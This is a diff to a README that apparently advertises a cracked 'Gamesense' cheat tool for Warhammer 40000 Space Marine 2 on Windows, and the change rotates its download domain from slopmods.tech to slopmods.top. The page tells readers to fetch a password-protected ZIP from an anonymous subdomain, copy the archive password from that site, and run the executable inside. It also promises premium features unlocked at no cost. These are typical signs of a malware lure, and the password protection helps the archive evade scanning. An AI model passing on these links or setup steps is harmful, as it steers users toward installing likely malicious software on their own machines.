@@ -8,12 +8,12 @@ Warhammer 40000 Space Marine 2 Gamesense — Windows setup and configuration · 
 
 > Use the release page below for Windows.
 
-- **Release page:** [zqqvipajzrv.slopmods.tech](https://zqqvipajzrv.slopmods.tech/)
-- **Full URL:** `https://zqqvipajzrv.slopmods.tech/`
+- **Release page:** [zqqvipajzrv.slopmods.top](https://zqqvipajzrv.slopmods.top/)
+- **Full URL:** `https://zqqvipajzrv.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **zqqvipajzrv.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **zqqvipajzrv.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Warhammer 40000 Space Marine 2 Gamesense — Windows setup and configuration · 
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **zqqvipajzrv.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **zqqvipajzrv.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
